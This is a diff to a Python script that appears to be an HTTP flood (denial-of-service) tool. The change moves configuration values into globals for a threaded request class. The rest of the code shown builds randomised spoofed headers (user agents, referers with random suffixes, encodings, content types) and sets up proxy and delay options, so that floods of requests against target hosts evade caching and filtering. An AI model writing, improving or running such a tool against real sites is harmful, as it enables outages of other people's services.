@@ -127,34 +127,55 @@ referer_list()
 
 for hosta in host:
     referers.append(f"https://{hosta}/")
-
+randomdelay = config["thread"]["randomdelay"]
+payload = json.dumps(config["payload"])
+mindelay = int(config["thread"]["mindelay"])
+maxdelay = int(config["thread"]["maxdelay"])
+method = str(config["method"]).lower()
+timeout = int(config["thread"]["timeout"])
+normaldelay = int(config["thread"]["normaldelay"])
+usenormaldelay = config["thread"]["usenormaldelay"]
+nodelay = config["thread"]["nodelay"]
+usepayload = config["usepayload"]
+head = config["headers"]
+proxies = config["proxies"]
+useproxies = config["useproxies"]
+limiter = config["thread"]["limiter"]
 acceptcharset = ["ISO-8859-1","shift-jis","US-ASCII","utf-8"]
 contenttypes = ["text/plain","application/json","text/csv","application/pdf","application/zip","application/xslm","text/css"]
 contentencodings = ["gzip","compress","identity","deflate","br"]
 langcodea = lang()
 class httpcall(threading.Thread):
     def __init__(self):
-        global config
-        global useragents
-        global referers
+        global randomdelay
+        global payload
+        global mindelay
+        global maxdelay
+        global method
+        global timeout
+        global normaldelay
+        global usenormaldelay
+        global nodelay
+        global usepayload
+        global head
+        global proxies
+        global useproxies
+        global limiter
+        self.randomdelay = randomdelay
+        self.payload = payload
+        self.mindelay = mindelay
+        self.maxdelay = maxdelay
+        self.method = method
+        self.timeout = timeout
+        self.normaldelay = normaldelay
+        self.usenormaldelay = usenormaldelay
+        self.nodelay = nodelay
+        self.usepayload = usepayload
+        self.head = head
+        self.proxies = proxies
+        self.useproxies = useproxies
+        self.limiter = limiter
         threading.Thread.__init__(self)
-        self.randomdelay = config["thread"]["randomdelay"]
-        self.payload = json.dumps(config["payload"])
-        self.useragents = useragents
-        self.referers = referers
-        self.limiter = config["thread"]["limiter"]
-        self.mindelay = int(config["thread"]["mindelay"])
-        self.maxdelay = int(config["thread"]["maxdelay"])
-        self.method = str(config["method"]).lower()
-        self.timeout = int(config["thread"]["timeout"])
-        self.normaldelay = int(config["thread"]["normaldelay"])
-        self.usenormaldelay = config["thread"]["usenormaldelay"]
-        self.nodelay = config["thread"]["nodelay"]
-        self.usepayload = config["usepayload"]
-        self.head = config["headers"]
-        
-        self.useproxies = config["useproxies"]
-        self.limiter = config["thread"]["limiter"]
     def run(self):
         global proxies
         global url
@@ -163,6 +184,8 @@ class httpcall(threading.Thread):
         global contentencodings
         global contenttypes
         global acceptcharset
+        global useragents
+        global referers
         for __ in range(5):
             for k in range(len(url)):
                 try:
@@ -184,12 +207,12 @@ class httpcall(threading.Thread):
                 tmp = []
                 tmp.append({
                     "Accept":random.choice(accepts),
-                    "User-Agent": random.choice(self.useragents),
+                    "User-Agent": random.choice(useragents),
                     "Cache-Control": "no-cache",
                     "Accept-Encoding": random.choice(contentencodings),
                     "Accept-Charset": f"{random.choice(acceptcharset)};q=0.7,*;q=0.7",
                     "Origin":f"https://{usehost}",
-                    "Referer": random.choice(self.referers) + buildblock(random.randint(5,10)),
+                    "Referer": random.choice(referers) + buildblock(random.randint(5,10)),
                     "Keep-Alive": str(random.randint(110,120)),
                     "Accept-Language": f"{langcodea},{langcodea};q=0.{random.randint(4,9)}",
                     "Connection": "keep-alive",
@@ -197,12 +220,12 @@ class httpcall(threading.Thread):
                 })
                 tmp.append({
                     "Accept": random.choice(accepts),
-                    "User-Agent": random.choice(self.useragents),
+                    "User-Agent": random.choice(useragents),
                     "Cache-Control": "no-cache",
                     "Accept-Charset": f"{random.choice(acceptcharset)};q=0.7,*;q=0.7",
                     "Accept-Encoding": random.choice(contentencodings),
                     "content-type": random.choice(contenttypes),#
-                    "Referer": random.choice(self.referers) + buildblock(random.randint(5,10)),
+                    "Referer": random.choice(referers) + buildblock(random.randint(5,10)),
                     "Keep-Alive": str(random.randint(110,120)),
                     "Accept-Language": f"{langcodea},{langcodea};q=0.{random.randint(4,9)}",
                     "Connection": "keep-alive",
@@ -210,35 +233,35 @@ class httpcall(threading.Thread):
                 })
                 tmp.append({
                     "Accept": random.choice(accepts),
-                    "User-Agent": random.choice(self.useragents),
+                    "User-Agent": random.choice(useragents),
                     "Cache-Control": "no-cache",
                     "Accept-Charset": f"{random.choice(acceptcharset)};q=0.7,*;q=0.7",
                     "content-type": random.choice(contenttypes),#
-                    "Referer": random.choice(self.referers) + buildblock(random.randint(5,10)),
+                    "Referer": random.choice(referers) + buildblock(random.randint(5,10)),
                     "Keep-Alive": str(random.randint(110,120)),
                     "Accept-Language": f"{langcodea},{langcodea};q=0.{random.randint(4,9)}",
                     "Connection": "keep-alive"
                 })
                 tmp.append({
                     "Accept": random.choice(accepts),
-                    "User-Agent": random.choice(self.useragents),
+                    "User-Agent": random.choice(useragents),
                     "Cache-Control": "no-cache",
                     "Accept-Charset": f"{random.choice(acceptcharset)};q=0.7,*;q=0.7",
                     "Accept-Encoding": random.choice(contentencodings),
                     "Origin":f"https://{usehost}",
                     "content-type": random.choice(contenttypes),#
-                    "Referer": random.choice(self.referers) + buildblock(random.randint(5,10)),
+                    "Referer": random.choice(referers) + buildblock(random.randint(5,10)),
                     "Accept-Language": f"{langcodea},{langcodea};q=0.{random.randint(4,9)}",
                     "Host": usehost
                 })
                 tmp.append({
                     "Accept": random.choice(accepts),
-                    "User-Agent": random.choice(self.useragents),
+                    "User-Agent": random.choice(useragents),
                     "Cache-Control": "no-cache",
                     "Accept-Charset": f"{random.choice(acceptcharset)};q=0.7,*;q=0.7",
                     "Origin":f"https://{usehost}",
                     "content-type": random.choice(contenttypes),#
-                    "Referer": random.choice(self.referers) + buildblock(random.randint(5,10)),
+                    "Referer": random.choice(referers) + buildblock(random.randint(5,10)),
                     "Accept-Language": f"{langcodea},{langcodea};q=0.{random.randint(4,9)}"
                 })
                 header = deepmerge(random.choice(tmp),self.head)
